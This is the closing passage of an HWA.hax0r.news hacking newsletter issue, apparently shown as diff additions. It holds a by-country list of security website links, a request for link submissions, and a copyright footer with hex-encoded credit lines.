+      Netherlands...: http://security.pine.nl/
+      Russia........: http://www.tsu.ru/~eugene/
+      Indonesia.....: http://www.k-elektronik.org/index2.html
+                      http://members.xoom.com/neblonica/
+      Brasil........: http://www.psynet.net/ka0z
+                      http://www.elementais.cjb.net           
+
+    Got a link for this section? email it to hwa@press.usmc.net and i'll 
+    review it and post it here if it merits it. 
+    
+    
+
+  -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-  
+    --EoF-HWA-EoF--EoF-HWA-EoF--EoF-HWA-EoF--EoF-HWA-EoF--EoF-HWA-EoF--       
+       
+    (c) Cruciphux/HWA.hax0r.news
+    (r) Cruciphux is a trade mark of Harpies With Ailments corp.
+    
+     --EoF-HWA-EoF--EoF-HWA-EoF--EoF-HWA-EoF--EoF-HWA-EoF--EoF-HWA-EoF--
+  -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-
+   [ 28 63 29 20 31 39 39 39 20 63 72 75 63 69 70 68 75 78 20 68 77 61 ]
+       [45:6E:64]-[28:63:29:31:39:39:38:20:68:77:61:20:73:74:65:76:65]     
